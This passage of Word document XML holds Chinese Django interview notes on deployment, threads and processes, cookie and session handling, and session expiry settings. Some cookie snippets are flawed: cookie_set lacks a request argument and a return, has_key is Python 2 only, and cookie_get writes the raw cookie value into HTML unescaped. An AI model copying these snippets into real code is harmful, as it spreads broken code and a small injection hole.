        <w:t>1有部署经验，在阿里云服务器上部署的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB51A79" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="479" w:name="6163-1535454486958"/>
      <w:bookmarkEnd w:id="479"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2.技术有：nginx + uwsgi 的方式来部署 Django 项目</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C558E4" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="480" w:name="8730-1535454486958"/>
      <w:bookmarkEnd w:id="480"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3.无标准答案（例：压力测试一两千）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AF000DC" w14:textId="6FC21328"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481" w:name="6726-1535454514861"/>
      <w:bookmarkStart w:id="482" w:name="7455-1535453910915"/>
      <w:bookmarkEnd w:id="481"/>
      <w:bookmarkEnd w:id="482"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>017</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中哪里用到了线程</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">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哪里用到了协程</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">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哪里用到了进程？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="645DF68C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="483" w:name="9164-1535453910943"/>
      <w:bookmarkEnd w:id="483"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django中耗时的任务用一个进程或者线程来执行，比如发邮件，使用 celery。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C8582B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="484" w:name="2859-1535454544493"/>
      <w:bookmarkEnd w:id="484"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>部署 django 项目的时候，配置文件中设置了进程和协程的相关配置。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37EB0E09" w14:textId="0B518391"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485" w:name="1746-1535454576055"/>
      <w:bookmarkStart w:id="486" w:name="9524-1535454576785"/>
      <w:bookmarkEnd w:id="485"/>
      <w:bookmarkEnd w:id="486"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>018</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w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>关闭浏览器，怎样清除</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookies </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8653BF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="487" w:name="5524-1535454585770"/>
      <w:bookmarkEnd w:id="487"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>设 置 Cookie:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F47B67A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="488" w:name="9854-1535454673931"/>
      <w:bookmarkEnd w:id="488"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def cookie_set():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D305C55" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="489" w:name="1977-1535454637412"/>
      <w:bookmarkEnd w:id="489"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>response = HttpResponse("&lt;h1&gt;设置 Cookie，请查看响应报文头&lt;/h1&gt;")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33530604" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="490" w:name="3820-1535454653959"/>
      <w:bookmarkEnd w:id="490"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>response.set_cookie('h1', 'hello django')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131A98D4" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="491" w:name="7626-1535453910960"/>
      <w:bookmarkEnd w:id="491"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>读 取 Cookie:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E65BA87" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="492" w:name="6158-1535453910994"/>
      <w:bookmarkEnd w:id="492"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def cookie_get(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB1D21E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="493" w:name="4933-1535454727745"/>
      <w:bookmarkEnd w:id="493"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>response = HttpResponse("读取 Cookie，数据如下：&lt;br&gt;")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D69328" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="494" w:name="5545-1535454744333"/>
      <w:bookmarkEnd w:id="494"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>if request.COOKIES.has_key('h1'):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D8193B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="495" w:name="2936-1535454744333"/>
      <w:bookmarkEnd w:id="495"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>response.write('&lt;h1&gt;' + request.COOKIES['h1'] + '&lt;/h1&gt;')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="524CD302" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="496" w:name="2754-1535453911035"/>
      <w:bookmarkEnd w:id="496"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>以键值对的格式写会话:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6847E71D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="497" w:name="4169-1535454777865"/>
      <w:bookmarkEnd w:id="497"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.session['键']=值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297A3940" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="498" w:name="6910-1535453911053"/>
      <w:bookmarkEnd w:id="498"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>根据键读取值:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F30D70" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="499" w:name="8219-1535454794314"/>
      <w:bookmarkEnd w:id="499"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.session.get('键',默认值)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17575C94" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="500" w:name="4790-1535454825036"/>
      <w:bookmarkEnd w:id="500"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>清除所有会话，在存储中删除值部分:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8759E8" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="501" w:name="9638-1535454828899"/>
      <w:bookmarkEnd w:id="501"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.session.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C90DF57" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="502" w:name="6018-1535453911171"/>
      <w:bookmarkEnd w:id="502"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>清除会话数据，在存储中删除会话的整条数据:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD4E012" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="503" w:name="3040-1535454845837"/>
      <w:bookmarkEnd w:id="503"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.session.flush()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA52015" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="504" w:name="9876-1535453911200"/>
      <w:bookmarkEnd w:id="504"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>删除会话中的指定键及值，在存储中只删除某个键及对应的值:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12CC7DC1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="505" w:name="5350-1535454866459"/>
      <w:bookmarkEnd w:id="505"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>del request.session['键']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A010A76" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="506" w:name="1832-1535453911226"/>
      <w:bookmarkEnd w:id="506"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>设置会话的超时时间，如果没有指定过期时间则两个星期后过期。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FB374C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="507" w:name="9121-1535454973332"/>
      <w:bookmarkEnd w:id="507"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.session.set_expiry(value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54851DB3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="508" w:name="8959-1535454953375"/>
      <w:bookmarkEnd w:id="508"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果 value 是一个整数，会话将在 value 秒没有活动后过期。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D1339F" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="509" w:name="6334-1535454884564"/>
      <w:bookmarkEnd w:id="509"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果 value 为 0，那么用户会话的 Cookie 将在用户的浏览器关闭时过期。如果 value 为 None，那么会话永不过期。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B61B34" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="510" w:name="4995-1535454913205"/>
      <w:bookmarkEnd w:id="510"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Session 依赖于 Cookie，如果浏览器不能保存 cookie 那么  session  就失效了。因为它需要浏览器的 cookie 值去 session 里做对比。session 就是用来在服务器端保存用户的会话状态。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623E5575" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="511" w:name="7998-1535454914213"/>
      <w:bookmarkEnd w:id="511"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>cookie 可以有过期时间，这样浏览器就知道什么时候可以删除 cookie 了。 如果 cookie  没有设置过期时间，当用户关闭浏览器的时候，cookie 就自动过期了。你可以改变</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6152DB" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="512" w:name="8413-1535454914213"/>
      <w:bookmarkEnd w:id="512"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SESSION_EXPIRE_AT_BROWSER_CLOSE 的设置来控制 session 框架的这一行为。缺省情况下，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB45DE0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="513" w:name="5451-1535454914213"/>
      <w:bookmarkEnd w:id="513"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SESSION_EXPIRE_AT_BROWSER_CLOSE 设置为 False ，这样，会话 cookie 可以在用户浏览器中保持有效达 SESSION_COOKIE_AGE 秒（缺省设置是两周，即 1，209，600 秒）如果你不想用户每次打开浏览器都必须重新登陆的话，用这个参数来帮你。如果 SESSION_EXPIRE_AT_BROWSER_CLOSE 设置为 True，当浏览器关闭时，Django 会使 cookie 失效。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E820455" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="514" w:name="2097-1535454914213"/>
      <w:bookmarkEnd w:id="514"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SESSION_COOKIE_AGE：设置 cookie 在浏览器中存活的时间。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CED264A" w14:textId="354EA06E"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15" w:name="1773-1535453911266"/>
      <w:bookmarkStart w:id="516" w:name="2553-1535455071439"/>
      <w:bookmarkEnd w:id="515"/>
      <w:bookmarkEnd w:id="516"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>019</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代码优化从哪些方面考虑？有什么想法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E2D700" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="517" w:name="8726-1535455074200"/>
      <w:bookmarkEnd w:id="517"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1）优化算法时间</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695EE6FA" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
